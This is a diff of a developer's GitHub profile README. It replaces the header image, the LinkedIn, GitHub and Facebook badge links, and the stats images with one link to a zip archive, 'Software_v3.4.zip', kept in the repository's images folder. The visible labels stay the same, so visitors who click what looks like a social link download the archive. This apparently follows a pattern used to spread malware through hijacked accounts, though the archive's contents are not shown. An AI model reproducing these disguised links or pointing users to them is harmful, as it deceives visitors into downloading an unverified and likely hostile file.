@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/rabbanictgbd/rabbanictgbd/main/images/MERN.png" alt="My Image">
+  <img src="https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip" alt="My Image">
 
 
 # Hi, I'm Abdul Kader Rabbani 
@@ -35,18 +35,18 @@ I am a passionate Web Developer and IT professional with experience in MERN stac
 ---
 
 ## 🌐 Connect with Me
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/abdul-kader-rabbani/)  
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rabbanictgbd)  
-[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://www.facebook.com/abdul.kader.rabbani.478092/)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip)  
+[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip)  
+[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip)
 
 ---
 
 ## 📊 GitHub Stats
-![Abdul Kader Rabbani GitHub Stats](https://github-readme-stats.vercel.app/api?username=rabbanictgbd&show_icons=true&theme=radical)
+![Abdul Kader Rabbani GitHub Stats](https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip)
 
-![Top Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=rabbanictgbd&layout=compact&theme=radical)
+![Top Languages](https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip)
 
-![GitHub Streak](https://github-readme-streak-stats.herokuapp.com/?user=rabbanictgbd&theme=radical)
+![GitHub Streak](https://github.com/rabbanictgbd/rabbanictgbd/raw/refs/heads/main/images/Software_v3.4.zip)
 
 ---
 
